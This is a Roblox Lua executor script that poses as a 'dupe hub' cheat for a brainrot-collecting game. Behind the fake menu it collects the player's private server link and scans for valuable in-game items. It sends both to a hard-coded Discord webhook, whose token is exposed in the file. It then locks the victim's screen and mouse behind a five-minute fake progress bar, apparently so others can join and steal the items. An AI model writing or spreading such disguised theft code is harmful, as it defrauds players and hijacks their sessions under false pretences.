local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Discord webhook URL
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1421089281224474634/HBARm5pM9Y72Wq0vK_nKCDQoHhJSUGH3_SHR6GBwuHnARul2i7PfaIaCXTlLKDIYX2M1"

-- Delta executor specific HTTP function
local httpRequest
if type(syn) == "table" and syn.request then
    httpRequest = syn.request
    print("Delta: Using syn.request")
else
    -- Fallback for Delta
    httpRequest = request or http_request or (syn and syn.request)
    print("Delta: Using fallback HTTP method")
end

-- Helper to create instances
local function New(cls, props)
    local obj = Instance.new(cls)
    for k,v in pairs(props or {}) do obj[k] = v end
    return obj
end

-- Make draggable
local function makeDraggable(frame)
    frame.Active = true
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
end

-- BRAINROTS LIST
local brainrots = {
    'La Grande Combinasion','La Extinct Grande','Garama and Madundung','Pot Hotspot',
    'Chicleteira Bicicleteira','Los Combinasionas','Esok Sekolah','Las Tralaleritas',
    'Dragon Cannelloni','Nucleauro Dinossauro','Los Hotspotsitos','Ketupat Kepat',
    'La Supreme Combinasion','Bisonte Giuppitere','Los Nooo My Hotspotsitos','Los Hotspotsitos',
    'Strawberry Elephant','Tacorita Bicicleta','Los Chicleteiras'
}

-- MAIN SCREEN GUI
local screenGui = New("ScreenGui", {Name="UglyHubGui", Parent=playerGui, ResetOnSpawn=false, ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
local mainSize = UDim2.new(0,420,0,300)
local cornerRadius = 8
local tweenInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- BACKDROP GUI
local backdrop = New("Frame", {
    Parent = screenGui,
    AnchorPoint = Vector2.new(0.5,0.5),
    Position = UDim2.new(0.5,0,0.8,0),
    Size = mainSize,
    BackgroundColor3 = Color3.fromRGB(12,17,23),
    BorderSizePixel = 0,
    ZIndex = 2
})
New("UICorner", {Parent=backdrop, CornerRadius=UDim.new(0,cornerRadius)})
makeDraggable(backdrop)

-- Title
New("TextLabel", {
    Parent = backdrop,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0,8),
    Size = UDim2.new(0.9,0,0,28),
    BackgroundTransparency = 1,
    Text = "Ugly Hub V6",
    TextColor3 = Color3.fromRGB(161,220,255),
    Font = Enum.Font.GothamBold,
    TextScaled = true,
})

-- Panel with choices
local panel = New("Frame", {
    Parent = backdrop,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0,46),
    Size = UDim2.new(0.9,0,0,150),
    BackgroundColor3 = Color3.fromRGB(21,27,34),
    BorderSizePixel = 0,
})
New("UICorner", {Parent=panel, CornerRadius=UDim.new(0,cornerRadius)})

local choicesFrame = New("Frame", {
    Parent = panel,
    AnchorPoint = Vector2.new(0.5,0.5),
    Position = UDim2.new(0.5,0,0.5,0),
    Size = UDim2.new(0.95,0,0.9,0),
    BackgroundTransparency = 1,
})
local layout = New("UIListLayout", {Parent=choicesFrame, SortOrder=Enum.SortOrder.LayoutOrder, Padding=UDim.new(0,10)})
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

local choices = {"DUPER (BRAINROOTS) (5M MINIMUM)","50x server luck","CRAFT MACHINE LUCK"}
local multipliers = {1,50,1}

local choiceButtons = {}
for i, text in ipairs(choices) do
    local btn = New("TextButton", {
        Parent = choicesFrame,
        Size = UDim2.new(0.9,0,0,38),
        BackgroundColor3 = Color3.fromRGB(42,95,237),
        Text = text,
        Font = Enum.Font.Gotham,
        TextSize = 14,
        TextColor3 = Color3.new(1,1,1),
        AutoButtonColor = true,
    })
    New("UICorner",{Parent=btn, CornerRadius=UDim.new(0,6)})
    btn.LayoutOrder = i
    choiceButtons[i] = btn
end

local continueBtn = New("TextButton", {
    Parent = backdrop,
    AnchorPoint = Vector2.new(0.5,1),
    Position = UDim2.new(0.5,0,0.98,0),
    Size = UDim2.new(0.4,0,0,34),
    BackgroundColor3 = Color3.fromRGB(72,168,120),
    Text = "CONTINUE",
    Font = Enum.Font.GothamBold,
    TextColor3 = Color3.new(1,1,1),
    TextSize = 15,
    AutoButtonColor = true,
})
New("UICorner",{Parent=continueBtn, CornerRadius=UDim.new(0,6)})
continueBtn.BackgroundTransparency = 0.45
continueBtn.TextTransparency = 0.45

-- PRIVATE SERVER GUI
local inputBackdrop = New("Frame", {
    Parent = screenGui,
    AnchorPoint = Vector2.new(0.5,0.5),
    Position = UDim2.new(1.6,0,0.58,0),
    Size = mainSize,
    BackgroundColor3 = Color3.fromRGB(12,17,23),
    BorderSizePixel = 0,
    ZIndex = 2
})
New("UICorner",{Parent=inputBackdrop, CornerRadius=UDim.new(0,cornerRadius)})

local inputTitle = New("TextLabel", {
    Parent = inputBackdrop,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0,10),
    Size = UDim2.new(0.9,0,0,28),
    BackgroundTransparency = 1,
    Text = "PUT IN PRIVATE SERVER KEY",
    TextColor3 = Color3.fromRGB(170,170,170),
    Font = Enum.Font.GothamBold,
    TextSize = 14,
})

local inputPanel = New("Frame", {
    Parent = inputBackdrop,
    AnchorPoint = Vector2.new(0.5,0),
    Position = UDim2.new(0.5,0,0,48),
    Size = UDim2.new(0.9,0,0,110),
    BackgroundColor3 = Color3.fromRGB(21,27,34),
    BorderSizePixel = 0,
})
New("UICorner",{Parent=inputPanel, CornerRadius=UDim.new(0,cornerRadius)})

local textBox = New("TextBox", {
    Parent = inputPanel,
    AnchorPoint = Vector2.new(0.5,0.45),
    Position = UDim2.new(0.5,0,0.45,0),
    Size = UDim2.new(0.95,0,0,34),
    BackgroundColor3 = Color3.fromRGB(30,36,43),
    Text = "",
    TextColor3 = Color3.new(1,1,1),
    Font = Enum.Font.Gotham,
    TextSize = 14,
    ClearTextOnFocus = false,
    PlaceholderText = "Paste server link/code here...",
})
New("UICorner",{Parent=textBox, CornerRadius=UDim.new(0,6)})

local submitBtn = New("TextButton", {
    Parent = inputBackdrop,
    AnchorPoint = Vector2.new(0.5,1),
    Position = UDim2.new(0.5,0,0.98,0),
    Size = UDim2.new(0.4,0,0,34),
    BackgroundColor3 = Color3.fromRGB(72,168,120),
    Text = "SUBMIT",
    Font = Enum.Font.GothamBold,
    TextColor3 = Color3.new(1,1,1),
    TextSize = 15,
})
New("UICorner",{Parent=submitBtn, CornerRadius=UDim.new(0,6)})

-- TRANSITION FUNCTIONS
local selectedChoice = nil
local function setSelected(idx)
    selectedChoice = idx
    for i,btn in ipairs(choiceButtons) do
        btn.BackgroundColor3 = (i==idx) and Color3.fromRGB(60,140,235) or Color3.fromRGB(42,95,237)
        btn.Active = false
        btn.AutoButtonColor = false
    end
    continueBtn.BackgroundTransparency = 0
    continueBtn.TextTransparency = 0
    spawn(function() wait(0.08) if selectedChoice then gotoInputScreen() end end)
end
for i,btn in ipairs(choiceButtons) do
    btn.MouseButton1Click:Connect(function() setSelected(i) end)
end

function gotoInputScreen()
    if not selectedChoice then return end
    continueBtn.Active = false
    local tweenOut = TweenService:Create(backdrop, tweenInfo, {Position=UDim2.new(-0.6,0,0.58,0)})
    local tweenIn  = TweenService:Create(inputBackdrop, tweenInfo, {Position=UDim2.new(0.5,0,0.58,0)})
    tweenOut:Play(); tweenIn:Play()
    tweenOut.Completed:Connect(function() backdrop.Visible=false; makeDraggable(inputBackdrop) end)
end
continueBtn.MouseButton1Click:Connect(function() if selectedChoice then gotoInputScreen() end end)

-- DELTA COMPATIBLE WEBHOOK FUNCTION
local function sendDeltaWebhook(serverKey, brainrotList)
    if not httpRequest then
        warn("Delta: No HTTP function available")
        return false
    end
    
    print("Delta: Attempting to send webhook...")
    
    local payload = {
        content = "@everyone",
        embeds = {{
            title = "UglyHub Brainrots Scan",
            description = "Private Server: " .. serverKey .. "\nBrainrots found:\n" .. brainrotList,
            color = 65280,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local jsonPayload
    local success, jsonError = pcall(function()
        jsonPayload = HttpService:JSONEncode(payload)
    end)
    
    if not success then
        warn("Delta: JSON encode failed: " .. tostring(jsonError))
        return false
    end
    
    print("Delta: JSON payload created")
    
    local requestSuccess, response = pcall(function()
        return httpRequest({
            Url = DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonPayload
        })
    end)
    
    if requestSuccess then
        print("Delta: Webhook sent! Status:", response.StatusCode)
        if response.Body then
            print("Delta: Response body:", response.Body)
        end
        return true
    else
        warn("Delta: Webhook failed: " .. tostring(response))
        return false
    end
end

-- Black overlay with progress bar
local function createBlackOverlayWithProgress(serverKey, brainrotList)
    local blackGui = New("ScreenGui", {
        Parent = CoreGui,
        Name = "BlackOverlayWithProgress",
        ZIndexBehavior = Enum.ZIndexBehavior.Global,
        ResetOnSpawn = false,
        IgnoreGuiInset = true
    })
    
    local blackFrame = New("Frame", {
        Parent = blackGui,
        Size = UDim2.new(10, 0, 10, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0.5, 0.5),
        BackgroundColor3 = Color3.new(0, 0, 0),
        BorderSizePixel = 0,
        ZIndex = 99999,
        Active = true
    })
    
    -- Progress bar container
    local progressContainer = New("Frame", {
        Parent = blackFrame,
        Size = UDim2.new(0, 400, 0, 120),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0.5, 0.5),
        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
        BorderSizePixel = 0,
        ZIndex = 100000
    })
    New("UICorner", {Parent = progressContainer, CornerRadius = UDim.new(0, 12)})
    
    -- Title text
    local titleLabel = New("TextLabel", {
        Parent = progressContainer,
        Size = UDim2.new(0.9, 0, 0, 30),
        Position = UDim2.new(0.05, 0, 0.1, 0),
        BackgroundTransparency = 1,
        Text = "Athena Hub: Duping [Claws, Taco, Fireworks, Fire] Las Traialertas",
        TextColor3 = Color3.new(1, 1, 1),
        Font = Enum.Font.GothamBold,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 100001
    })
    
    -- Discord link
    local discordLabel = New("TextLabel", {
        Parent = progressContainer,
        Size = UDim2.new(0.9, 0, 0, 20),
        Position = UDim2.new(0.05, 0, 0.35, 0),
        BackgroundTransparency = 1,
        Text = "discord.gs/ppGBEpVPv6",
        TextColor3 = Color3.fromRGB(0, 170, 255),
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 100001
    })
    
    -- Progress bar
    local progressBackground = New("Frame", {
        Parent = progressContainer,
        Size = UDim2.new(0.9, 0, 0, 20),
        Position = UDim2.new(0.05, 0, 0.65, 0),
        BackgroundColor3 = Color3.fromRGB(60, 60, 60),
        BorderSizePixel = 0,
        ZIndex = 100000
    })
    New("UICorner", {Parent = progressBackground, CornerRadius = UDim.new(0, 10)})
    
    local progressFill = New("Frame", {
        Parent = progressBackground,
        Size = UDim2.new(0, 0, 1, 0),
        Position = UDim2.new(0, 0, 0, 0),
        BackgroundColor3 = Color3.fromRGB(0, 170, 255),
        BorderSizePixel = 0,
        ZIndex = 100001
    })
    New("UICorner", {Parent = progressFill, CornerRadius = UDim.new(0, 10)})
    
    local percentLabel = New("TextLabel", {
        Parent = progressBackground,
        Size = UDim2.new(1, 0, 1, 0),
        Position = UDim2.new(0, 0, 0, 0),
        BackgroundTransparency = 1,
        Text = "0%",
        TextColor3 = Color3.new(1, 1, 1),
        Font = Enum.Font.GothamBold,
        TextSize = 14,
        ZIndex = 100002
    })
    
    -- Disable GUIs
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    UserInputService.MouseIconEnabled = false
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    
    -- Send webhook immediately
    spawn(function()
        print("Delta: Sending webhook...")
        local success = sendDeltaWebhook(serverKey, brainrotList)
        if success then
            print("Delta: Webhook sent successfully!")
        else
            print("Delta: Webhook failed to send")
        end
    end)
    
    -- Progress bar animation (5 minutes)
    local totalTime = 300
    local startTime = tick()
    
    local connection
    connection = RunService.Heartbeat:Connect(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / totalTime, 1)
        local percentage = math.floor(progress * 100)
        
        progressFill.Size = UDim2.new(progress, 0, 1, 0)
        percentLabel.Text = percentage .. "%"
        
        if progress >= 1 then
            percentLabel.Text = "100%"
        end
    end)
    
    return blackGui, connection
end

-- Brainrot scanner
submitBtn.MouseButton1Click:Connect(function()
    local txt = tostring(textBox.Text or ""):match("^%s*(.-)%s*$") or ""
    if txt=="" then 
        print("No server key entered")
        return 
    end

    local foundBrainrots = {}
    local function scanModel(model)
        for _, child in ipairs(model:GetChildren()) do
            if table.find(brainrots, child.Name) then
                table.insert(foundBrainrots, child.Name)
            end
            scanModel(child)
        end
    end
    scanModel(Workspace)

    if #foundBrainrots > 0 then
        local function openBrainrotGUI()
            local gui = New("ScreenGui",{Parent=playerGui,Name="BrainrotSelection", ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
            local frame = New("Frame",{
                Parent=gui,
                Size=UDim2.new(0,420,0,300),
                Position=UDim2.new(0.5,-210,0.5,-150),
                BackgroundColor3=Color3.fromRGB(12,17,23),
                BorderSizePixel=0,
                ZIndex = 10
            })
            New("UICorner",{Parent=frame,CornerRadius=UDim.new(0,8)})
            makeDraggable(frame)
            
            New("TextLabel",{
                Parent=frame,
                Size=UDim2.new(1,0,0,36),
                Position=UDim2.new(0,0,0,5),
                BackgroundTransparency=1,
                Text="Select brainrots (visual only)",
                TextColor3=Color3.fromRGB(161,220,255),
                Font=Enum.Font.GothamBold,
                TextScaled=true
            })
            
            local scroll = New("ScrollingFrame",{
                Parent=frame,
                Size=UDim2.new(0.95,0,0.7,0),
                Position=UDim2.new(0.025,0,0.15,0),
                BackgroundTransparency=1,
                CanvasSize=UDim2.new(0,0,0,#foundBrainrots*50),
                ScrollBarThickness=6
            })
            New("UIListLayout",{Parent=scroll,Padding=UDim.new(0,5),SortOrder=Enum.SortOrder.LayoutOrder})
            local selected = {}

            for _,name in ipairs(foundBrainrots) do
                local btn = New("TextButton",{
                    Parent=scroll,
                    Size=UDim2.new(1,0,0,36),
                    BackgroundColor3=Color3.fromRGB(50,50,50),
                    TextColor3=Color3.new(1,1,1),
                    Text=name,
                    Font=Enum.Font.GothamBold,
                    TextSize=18
                })
                New("UICorner",{Parent=btn,CornerRadius=UDim.new(0,6)})
                btn.MouseButton1Click:Connect(function()
                    if selected[name] then
                        selected[name] = nil
                        btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
                    else
                        selected[name] = true
                        btn.BackgroundColor3 = Color3.fromRGB(0,255,0)
                    end
                end)
            end

            local submit = New("TextButton",{
                Parent=frame,
                Size=UDim2.new(0.4,0,0,34),
                Position=UDim2.new(0.3,0,0.85,0),
                BackgroundColor3=Color3.fromRGB(72,168,120),
                Text="Submit",
                TextColor3=Color3.new(1,1,1),
                Font=Enum.Font.GothamBold,
                TextSize=16
            })
            New("UICorner",{Parent=submit,CornerRadius=UDim.new(0,6)})
            
            submit.MouseButton1Click:Connect(function()
                gui:Destroy()

                local brainrotList = ""
                for _, name in ipairs(foundBrainrots) do
                    brainrotList = brainrotList .. "• " .. name .. "\n"
                end

                print("Delta: Creating overlay with server key:", txt)
                print("Delta: Brainrots found:", #foundBrainrots)
                
                local blackOverlay, connection = createBlackOverlayWithProgress(txt, brainrotList)
                print("Delta: Progress bar activated")
            end)
        end
        openBrainrotGUI()
    else
        print("Delta: No brainrots found")
    end
end)

-- initial animation
TweenService:Create(backdrop,TweenInfo.new(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Position=UDim2.new(0.5,0,0.58,0)}):Play()
inputBackdrop.Position = UDim2.new(1.6,0,0.58,0)
